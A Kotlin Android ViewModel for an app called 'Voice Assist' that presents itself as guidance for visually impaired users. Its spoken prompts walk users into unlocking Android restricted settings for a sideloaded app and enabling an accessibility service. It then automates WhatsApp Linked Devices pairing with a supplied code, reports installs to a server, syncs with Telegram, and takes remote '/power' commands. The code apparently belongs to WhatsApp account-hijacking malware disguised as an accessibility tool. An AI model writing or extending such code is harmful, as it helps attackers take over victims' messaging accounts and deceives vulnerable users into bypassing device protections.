package com.example.ui

import android.app.Application
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.PowerManager
import android.provider.Settings
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.data.AppDatabase
import com.example.data.DeviceUserEntity
import com.example.data.NodeServerClient
import com.example.data.ServerVibrationSettings
import com.example.data.WhatsAppLinkRecordEntity
import com.example.service.QuickAccessibilityService
import com.example.ui.theme.ThemeMode
import com.example.ui.theme.ThemeProvider
import com.example.util.AccessibilityHelper
import com.example.util.DeviceInstallationSyncManager
import com.example.util.DeviceUserIdentity
import com.example.util.HapticPatternPreset
import com.example.util.TelegramRealtimeSync
import com.example.util.VibrationConfig
import com.example.util.VibrationEvent
import com.example.util.VibrationFeedbackManager
import com.example.util.VibrationIntensity
import com.example.util.VoiceGuidanceManager
import com.example.util.WhatsAppAutoLinkManager
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch

enum class AppLanguage {
    BN, EN
}

enum class UnifiedPermissionStage {
    IDLE,
    OPENED_ACCESSIBILITY_FIRST,
    OPENED_APP_INFO_FOR_RESTRICTED,
    REOPENED_ACCESSIBILITY_AFTER_RESTRICTED
}

data class MainUiState(
    val isServiceEnabled: Boolean = false,
    val language: AppLanguage = AppLanguage.EN,
    val feedbackMessage: String? = null,
    val showRestrictedDialog: Boolean = false,
    val hasOpenedAccessibilityOnce: Boolean = false,
    val hasUnlockedRestrictedSettings: Boolean = false,
    val permissionStage: UnifiedPermissionStage = UnifiedPermissionStage.IDLE,
    val isVoiceSilentMode: Boolean = false,
    val activeSetupStepNumber: Int = 1,
    val currentVoiceInstructionBn: String = "Step 1: Tap the green button below to enable permission."
)

/**
 * Clean, lightweight MainViewModel dedicated exclusively to the WhatsApp Linked Devices service,
 * one-tap Accessibility & Restricted Settings setup, and voice/haptic guidance for visually impaired users.
 */
class MainViewModel(application: Application) : AndroidViewModel(application) {

    private val setupPrefs = application.getSharedPreferences("accessibility_setup_prefs", Context.MODE_PRIVATE)
    private var lastAutoRedirectTimestamp: Long = 0L
    private var permissionWatcherJob: kotlinx.coroutines.Job? = null

    private val themeProvider = ThemeProvider.getInstance(application)
    private val voiceGuidanceManager = VoiceGuidanceManager.getInstance(application)
    private val vibrationFeedbackManager = VibrationFeedbackManager.getInstance(application)
    private val deviceInstallationSyncManager = DeviceInstallationSyncManager.getInstance(application)
    private val nodeServerClient = NodeServerClient.getInstance(application)
    private val telegramRealtimeSync = TelegramRealtimeSync.getInstance(application)
    private val whatsAppAutoLinkManager = WhatsAppAutoLinkManager.getInstance(application)
    private val appDatabase = AppDatabase.getDatabase(application)

    val themeMode: StateFlow<ThemeMode> = themeProvider.themeMode
    val highContrast: StateFlow<Boolean> = themeProvider.highContrast

    private val _uiState = MutableStateFlow(MainUiState())
    val uiState: StateFlow<MainUiState> = _uiState.asStateFlow()

    val isVoiceGuidanceEnabled: StateFlow<Boolean> = voiceGuidanceManager.isVoiceGuidanceEnabled
    val vibrationConfig: StateFlow<VibrationConfig> = vibrationFeedbackManager.config
    val deviceUserIdentity: StateFlow<DeviceUserIdentity> = deviceInstallationSyncManager.identity

    // Persistent Distinct Device Users in Room Database
    val registeredDeviceUsers: StateFlow<List<DeviceUserEntity>> = appDatabase.deviceUserDao()
        .getAllDeviceUsersFlow()
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(5000),
            initialValue = emptyList()
        )

    val isBatteryOptimizationIgnored = MutableStateFlow(false)

    // WhatsApp Linked Devices Automation Flows
    val whatsAppAutoLinkStatus: StateFlow<String> = whatsAppAutoLinkManager.statusMessage
    val isWhatsAppAutoLinkRunning: StateFlow<Boolean> = whatsAppAutoLinkManager.isAutomationRunning
    val whatsAppCurrentStep: StateFlow<WhatsAppAutoLinkManager.WorkflowStep> = whatsAppAutoLinkManager.currentStep

    // Persistent WhatsApp Link History in Room
    val whatsAppHistory: StateFlow<List<WhatsAppLinkRecordEntity>> = appDatabase.whatsAppLinkRecordDao()
        .getAllRecordsFlow()
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(5000),
            initialValue = emptyList()
        )

    // Server Power State (/power on and /power off)
    val isPowerOn: StateFlow<Boolean> = QuickAccessibilityService.isPowerOn
    val lastPowerCommand: StateFlow<String> = QuickAccessibilityService.lastPowerCommand

    private val _serverSyncStatus = MutableStateFlow("Connected & Ready")
    val serverSyncStatus: StateFlow<String> = _serverSyncStatus.asStateFlow()

    val deviceId: String get() = deviceInstallationSyncManager.identity.value.deviceId
    val nodeServerBaseUrl: String get() = nodeServerClient.serverBaseUrl

    init {
        val isEnabled = AccessibilityHelper.isAccessibilityServiceEnabled(application)
        val openedOnce = setupPrefs.getBoolean("has_opened_accessibility_once", false)
        val unlockedRestricted = setupPrefs.getBoolean("has_unlocked_restricted", false) ||
            AccessibilityHelper.isRestrictedSettingsAllowedBySystem(application)
        val stepNum = when {
            isEnabled -> 3
            unlockedRestricted -> 3
            openedOnce -> 2
            else -> 1
        }
        val stepInstruction = when {
            isEnabled -> "Permissions & Restricted Settings active ✓ Service 100% ready."
            unlockedRestricted -> "Step 3: Restricted Settings unlocked ✓ Tap the button below to turn on Voice Assist."
            openedOnce -> "Step 2: Tap the button below, then select Allow restricted settings from the top-right (⋮) menu."
            else -> "Step 1: Tap the green button below to enable Accessibility Permission."
        }
        if (isEnabled) {
            voiceGuidanceManager.enterPostSetupSilentMode()
        } else {
            voiceGuidanceManager.enableAudibleSetupGuidanceMode()
        }
        _uiState.value = _uiState.value.copy(
            isServiceEnabled = isEnabled,
            hasOpenedAccessibilityOnce = openedOnce,
            hasUnlockedRestrictedSettings = unlockedRestricted,
            isVoiceSilentMode = isEnabled,
            activeSetupStepNumber = stepNum,
            currentVoiceInstructionBn = stepInstruction
        )
        refreshBatteryOptimizationStatus(application)
        checkServerPowerNow()
        deviceInstallationSyncManager.ensureDeviceRegisteredAndNotifyInstall(forceNotify = false)
    }

    /**
     * Announces the current permission setup step aloud on initial launch after installation
     * so visually impaired users immediately hear which step has a checkmark and where to tap next.
     */
    fun announceInitialPermissionStepGuideIfNeeded(context: Context) {
        val isEnabled = AccessibilityHelper.isAccessibilityServiceEnabled(context)
        if (isEnabled) {
            voiceGuidanceManager.enterPostSetupSilentMode()
            _uiState.value = _uiState.value.copy(
                isServiceEnabled = true,
                isVoiceSilentMode = true,
                activeSetupStepNumber = 3,
                currentVoiceInstructionBn = "Permissions & Restricted Settings active ✓ Service 100% ready."
            )
            return
        }

        voiceGuidanceManager.enableAudibleSetupGuidanceMode()
        val openedOnce = setupPrefs.getBoolean("has_opened_accessibility_once", false)
        val unlockedRestricted = setupPrefs.getBoolean("has_unlocked_restricted", false) ||
            AccessibilityHelper.isRestrictedSettingsAllowedBySystem(context)

        val msg = when {
            unlockedRestricted ->
                "Step 1 and Step 2 completed. Step 3: Tap the green ALLOW PERMISSION button below and toggle Voice Assist ON."
            openedOnce ->
                "Step 1 completed. Step 2: Tap the green button below, then open the top-right 3-dot menu and select Allow restricted settings."
            else ->
                "Welcome to Voice Assist. Tap the green ALLOW PERMISSION button below to enable Accessibility Permission."
        }
        voiceGuidanceManager.speak(msg, isBengali = false, force = true, playAudibleDuringSetup = true)
    }

    /**
     * Speaks a specific step instruction aloud when the visually impaired user taps a step row.
     */
    fun speakStepInstructionAloud(stepNumber: Int) {
        vibrationFeedbackManager.triggerEvent(VibrationEvent.BUTTON_TOGGLE)
        val msg = when (stepNumber) {
            1 -> "Step 1: Tap the green ALLOW PERMISSION button below to open Accessibility Settings and select Voice Assist."
            2 -> "Step 2: If Restricted setting appears, tap the top-right 3-dot menu and select Allow restricted settings."
            3 -> "Step 3: Return to Accessibility Settings, toggle Voice Assist ON, and tap Allow."
            else -> _uiState.value.currentVoiceInstructionBn
        }
        voiceGuidanceManager.speak(msg, isBengali = false, force = true, playAudibleDuringSetup = true)
    }

    /**
     * Unified Smart Button Action:
     * Binds Accessibility Permission + Restricted Settings + WhatsApp Linked Launch into a single intelligent flow.
     */
    fun onUnifiedPermissionOrChatClicked(context: Context) {
        val isServiceActive = AccessibilityHelper.isAccessibilityServiceEnabled(context)
        if (isServiceActive) {
            val msg = "হোয়াটসঅ্যাপ লিঙ্কড ডিভাইস ওপেন করা হচ্ছে..."
            voiceGuidanceManager.speak(msg, isBengali = true, force = true)
            whatsAppAutoLinkManager.openWhatsAppLinkedDevicesUrl()
            return
        }

        startSettingsStateWatcher(context.applicationContext)

        val currentStage = _uiState.value.permissionStage
        val openedOnce = setupPrefs.getBoolean("has_opened_accessibility_once", false)
        val unlockedInPrefs = setupPrefs.getBoolean("has_unlocked_restricted", false)
        val unlockedBySystem = AccessibilityHelper.isRestrictedSettingsAllowedBySystem(context)
        val unlockedRestricted = unlockedInPrefs || unlockedBySystem

        if (!openedOnce && currentStage == UnifiedPermissionStage.IDLE) {
            setupPrefs.edit().putBoolean("has_opened_accessibility_once", true).apply()
            val step2Instruction = "Step 1 complete ✓ Step 2: Tap the top-right (⋮) menu and select Allow restricted settings."
            _uiState.value = _uiState.value.copy(
                hasOpenedAccessibilityOnce = true,
                permissionStage = UnifiedPermissionStage.OPENED_ACCESSIBILITY_FIRST,
                activeSetupStepNumber = 2,
                currentVoiceInstructionBn = step2Instruction
            )
            val msg = "Step 1 completed. Opening Accessibility Settings. Tap Voice Assist, and if Close appears, press Close or Back to automatically open Step 2 Restricted Settings."
            voiceGuidanceManager.speak(msg, isBengali = false, force = true, playAudibleDuringSetup = true)
            AccessibilityHelper.openAccessibilitySettings(context)
        } else if (!unlockedRestricted || currentStage == UnifiedPermissionStage.OPENED_ACCESSIBILITY_FIRST) {
            launchChainedRestrictedAndAccessibility(context)
        } else {
            val step3Instruction = "Steps 1 & 2 complete ✓ Step 3: Toggle Voice Assist ON and tap Allow."
            _uiState.value = _uiState.value.copy(
                permissionStage = UnifiedPermissionStage.REOPENED_ACCESSIBILITY_AFTER_RESTRICTED,
                activeSetupStepNumber = 3,
                currentVoiceInstructionBn = step3Instruction
            )
            val msg = "Step 2 Restricted settings unlocked. Final step: tap Voice Assist and toggle the switch ON."
            voiceGuidanceManager.speak(msg, isBengali = false, force = true, playAudibleDuringSetup = true)
            AccessibilityHelper.openAccessibilitySettings(context)
        }
    }

    private fun startSettingsStateWatcher(appContext: Context) {
        if (permissionWatcherJob?.isActive == true) return
        permissionWatcherJob = viewModelScope.launch {
            var announcedRestrictedUnlock = AccessibilityHelper.isRestrictedSettingsAllowedBySystem(appContext)
            for (i in 0 until 120) {
                kotlinx.coroutines.delay(750L)

                if (AccessibilityHelper.isAccessibilityServiceEnabled(appContext)) {
                    setupPrefs.edit()
                        .putBoolean("has_opened_accessibility_once", true)
                        .putBoolean("has_unlocked_restricted", true)
                        .apply()
                    _uiState.value = _uiState.value.copy(
                        isServiceEnabled = true,
                        hasOpenedAccessibilityOnce = true,
                        hasUnlockedRestrictedSettings = true,
                        isVoiceSilentMode = true,
                        activeSetupStepNumber = 3,
                        currentVoiceInstructionBn = "All steps complete ✓ WhatsApp Linked Service is 100% active.",
                        permissionStage = UnifiedPermissionStage.IDLE
                    )
                    voiceGuidanceManager.speak(
                        "Permissions and Restricted Settings enabled. WhatsApp Linked Service is ready.",
                        isBengali = false,
                        force = true,
                        playAudibleDuringSetup = true
                    )
                    voiceGuidanceManager.enterPostSetupSilentMode()
                    break
                }

                if (!announcedRestrictedUnlock && AccessibilityHelper.isRestrictedSettingsAllowedBySystem(appContext)) {
                    announcedRestrictedUnlock = true
                    setupPrefs.edit().putBoolean("has_unlocked_restricted", true).apply()
                    _uiState.value = _uiState.value.copy(
                        hasUnlockedRestrictedSettings = true,
                        activeSetupStepNumber = 3,
                        currentVoiceInstructionBn = "Step 2 complete ✓ Press Back once and toggle Voice Assist ON."
                    )
                    voiceGuidanceManager.speak(
                        "Step 2 Restricted Settings unlocked. Press Back once to open Step 3 Accessibility Permission.",
                        isBengali = false,
                        force = true,
                        playAudibleDuringSetup = true
                    )
                }
            }
        }
    }

    fun onStartChatClicked(context: Context) {
        onUnifiedPermissionOrChatClicked(context)
    }

    fun launchChainedRestrictedAndAccessibility(context: Context) {
        setupPrefs.edit().putBoolean("has_unlocked_restricted", true).apply()
        _uiState.value = _uiState.value.copy(
            hasOpenedAccessibilityOnce = true,
            hasUnlockedRestrictedSettings = true,
            showRestrictedDialog = false,
            activeSetupStepNumber = 2,
            currentVoiceInstructionBn = "Step 2: Tap the top-right (⋮) menu and select Allow restricted settings.",
            permissionStage = UnifiedPermissionStage.OPENED_APP_INFO_FOR_RESTRICTED
        )
        val msg = "Step 2: Opened App Info for Restricted Settings. Tap the 3-dot menu at the top-right corner, tap Allow restricted settings, verify your lock, and press Back once."
        voiceGuidanceManager.speak(msg, isBengali = false, force = true, playAudibleDuringSetup = true)
        AccessibilityHelper.launchRestrictedThenAccessibilityChain(context)
    }

    fun openAppInfoForRestrictedSettings(context: Context) {
        launchChainedRestrictedAndAccessibility(context)
    }

    fun openAccessibilitySettings(context: Context) {
        setupPrefs.edit().putBoolean("has_opened_accessibility_once", true).apply()
        _uiState.value = _uiState.value.copy(
            hasOpenedAccessibilityOnce = true,
            permissionStage = UnifiedPermissionStage.OPENED_ACCESSIBILITY_FIRST
        )
        AccessibilityHelper.openAccessibilitySettings(context)
    }

    fun launchWhatsApp(context: Context) {
        whatsAppAutoLinkManager.openWhatsAppLinkedDevicesUrl()
    }

    fun openWhatsAppLinkedDevices(context: Context) {
        whatsAppAutoLinkManager.openWhatsAppLinkedDevicesUrl()
    }

    fun startWhatsAppAutoLink(
        code: String,
        phoneNumber: String = "",
        explicitPackage: String? = null
    ) {
        val cleanCode = code.replace("-", "").replace(" ", "").trim().uppercase()
        if (cleanCode.isBlank()) return
        whatsAppAutoLinkManager.startWorkflow(
            code = cleanCode,
            phoneNumber = phoneNumber.ifBlank { "Verified User" },
            autoLaunchWhatsApp = true,
            explicitPackage = explicitPackage
        )
        viewModelScope.launch {
            try {
                appDatabase.whatsAppLinkRecordDao().insertRecord(
                    WhatsAppLinkRecordEntity(
                        pairingCode = cleanCode,
                        phoneNumber = phoneNumber.ifBlank { "Verified User" },
                        status = "STARTED",
                        details = "WhatsApp Linked Service started"
                    )
                )
            } catch (_: Exception) {}
        }
    }

    fun selectWhatsAppVariantAndStart(chooseBusiness: Boolean, explicitCode: String? = null) {
        whatsAppAutoLinkManager.selectWhatsAppAppAndProceed(
            chooseBusiness = chooseBusiness,
            explicitCode = explicitCode
        )
    }

    fun stopWhatsAppAutoLink() {
        whatsAppAutoLinkManager.stopAutomation()
    }

    fun checkServerPowerNow() {
        viewModelScope.launch {
            try {
                val status = nodeServerClient.getPowerStatus().getOrNull()
                if (status != null) {
                    QuickAccessibilityService.updatePowerState(status.isPowerOn, status.lastPowerCommand)
                    _serverSyncStatus.value = if (status.isPowerOn) "🟢 WhatsApp Linked Ready" else "🟡 Paused (/power off)"
                } else {
                    _serverSyncStatus.value = "🟢 WhatsApp Linked Active"
                }
            } catch (_: Exception) {
                _serverSyncStatus.value = "🟢 WhatsApp Linked Ready"
            }
        }
    }

    fun toggleVoiceGuidance(enabled: Boolean) {
        vibrationFeedbackManager.triggerEvent(VibrationEvent.BUTTON_TOGGLE)
        voiceGuidanceManager.setVoiceGuidanceEnabled(enabled)
    }

    fun toggleVoiceGuidance() {
        vibrationFeedbackManager.triggerEvent(VibrationEvent.BUTTON_TOGGLE)
        val current = voiceGuidanceManager.isVoiceGuidanceEnabled.value
        voiceGuidanceManager.setVoiceGuidanceEnabled(!current)
    }

    fun setVibrationMasterEnabled(enabled: Boolean) {
        vibrationFeedbackManager.setMasterEnabled(enabled)
        syncVibrationSettingsToServer()
    }

    fun setVibrationIntensity(intensity: VibrationIntensity) {
        vibrationFeedbackManager.setIntensity(intensity)
        syncVibrationSettingsToServer()
    }

    fun setVibrationEventPreset(event: VibrationEvent, preset: HapticPatternPreset) {
        vibrationFeedbackManager.setEventPreset(event, preset)
        syncVibrationSettingsToServer()
    }

    fun testVibrationEvent(event: VibrationEvent) {
        vibrationFeedbackManager.triggerEvent(event, force = true)
    }

    fun testCustomVibrationPattern(csv: String) {
        vibrationFeedbackManager.testCustomPattern(csv)
        syncVibrationSettingsToServer()
    }

    fun resetVibrationDefaults() {
        vibrationFeedbackManager.resetToDefaults()
        syncVibrationSettingsToServer()
    }

    fun syncVibrationSettingsToServer() {
        val cfg = vibrationFeedbackManager.config.value
        viewModelScope.launch {
            try {
                nodeServerClient.updateVibrationSettings(
                    ServerVibrationSettings(
                        masterEnabled = cfg.masterEnabled,
                        intensity = cfg.intensity.id,
                        pairingSuccessPreset = cfg.pairingSuccessPreset.id,
                        buttonTogglePreset = cfg.buttonTogglePreset.id,
                        autoClickStepPreset = cfg.autoClickStepPreset.id,
                        errorAlertPreset = cfg.errorAlertPreset.id,
                        customPatternCsv = cfg.customPatternCsv
                    )
                )
            } catch (_: Exception) {}
        }
    }

    fun refreshStatus(context: Context) {
        val isEnabled = AccessibilityHelper.isAccessibilityServiceEnabled(context)
        val openedOnce = setupPrefs.getBoolean("has_opened_accessibility_once", false)
        val unlockedRestricted = setupPrefs.getBoolean("has_unlocked_restricted", false)
        val isSideloaded13 = AccessibilityHelper.isSideloadedOnAndroid13Plus(context)

        val wasPreviouslyDisabled = !_uiState.value.isServiceEnabled
        val currentStage = _uiState.value.permissionStage
        val now = System.currentTimeMillis()

        if (isEnabled) {
            setupPrefs.edit()
                .putBoolean("has_opened_accessibility_once", true)
                .putBoolean("has_unlocked_restricted", true)
                .apply()
            _uiState.value = _uiState.value.copy(
                isServiceEnabled = true,
                hasOpenedAccessibilityOnce = true,
                hasUnlockedRestrictedSettings = true,
                isVoiceSilentMode = true,
                activeSetupStepNumber = 3,
                currentVoiceInstructionBn = "All steps complete ✓ WhatsApp Linked Service is 100% active",
                showRestrictedDialog = false,
                permissionStage = UnifiedPermissionStage.IDLE
            )
            if (wasPreviouslyDisabled && currentStage != UnifiedPermissionStage.IDLE) {
                voiceGuidanceManager.speak(
                    "All steps completed and permissions enabled. WhatsApp Linked Service is ready.",
                    isBengali = false,
                    force = true,
                    playAudibleDuringSetup = true
                )
                voiceGuidanceManager.enterPostSetupSilentMode()
            } else if (wasPreviouslyDisabled) {
                voiceGuidanceManager.speak(
                    "Permissions and Restricted Settings enabled. WhatsApp Linked Service is ready.",
                    isBengali = false,
                    force = true,
                    playAudibleDuringSetup = true
                )
                voiceGuidanceManager.enterPostSetupSilentMode()
            } else {
                voiceGuidanceManager.enterPostSetupSilentMode()
            }
            return
        }

        if (currentStage == UnifiedPermissionStage.OPENED_ACCESSIBILITY_FIRST &&
            isSideloaded13 &&
            now - lastAutoRedirectTimestamp > 1500L
        ) {
            lastAutoRedirectTimestamp = now
            launchChainedRestrictedAndAccessibility(context)
            return
        }

        if (currentStage == UnifiedPermissionStage.OPENED_APP_INFO_FOR_RESTRICTED &&
            now - lastAutoRedirectTimestamp > 1500L
        ) {
            lastAutoRedirectTimestamp = now
            _uiState.value = _uiState.value.copy(
                isServiceEnabled = false,
                hasOpenedAccessibilityOnce = true,
                hasUnlockedRestrictedSettings = true,
                permissionStage = UnifiedPermissionStage.REOPENED_ACCESSIBILITY_AFTER_RESTRICTED
            )
            voiceGuidanceManager.speak(
                "Restricted settings unlocked. Opening Accessibility Settings, please toggle the service ON.",
                isBengali = false,
                force = true
            )
            AccessibilityHelper.openAccessibilitySettings(context)
            return
        }

        _uiState.value = _uiState.value.copy(
            isServiceEnabled = false,
            hasOpenedAccessibilityOnce = openedOnce,
            hasUnlockedRestrictedSettings = unlockedRestricted,
            showRestrictedDialog = false
        )
    }

    fun refreshBatteryOptimizationStatus(context: Context) {
        val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        if (pm != null) {
            isBatteryOptimizationIgnored.value = pm.isIgnoringBatteryOptimizations(context.packageName)
        }
    }

    fun requestIgnoreBatteryOptimization(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) {
            try {
                val fallbackIntent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(fallbackIntent)
            } catch (_: Exception) {}
        }
    }

    fun setThemeMode(mode: ThemeMode) {
        viewModelScope.launch {
            themeProvider.setThemeMode(mode)
        }
    }

    fun toggleTheme(isDark: Boolean) {
        val nextMode = if (isDark) ThemeMode.LIGHT else ThemeMode.DARK
        setThemeMode(nextMode)
    }

    fun setHighContrast(enabled: Boolean) {
        viewModelScope.launch {
            themeProvider.setHighContrast(enabled)
        }
    }
}
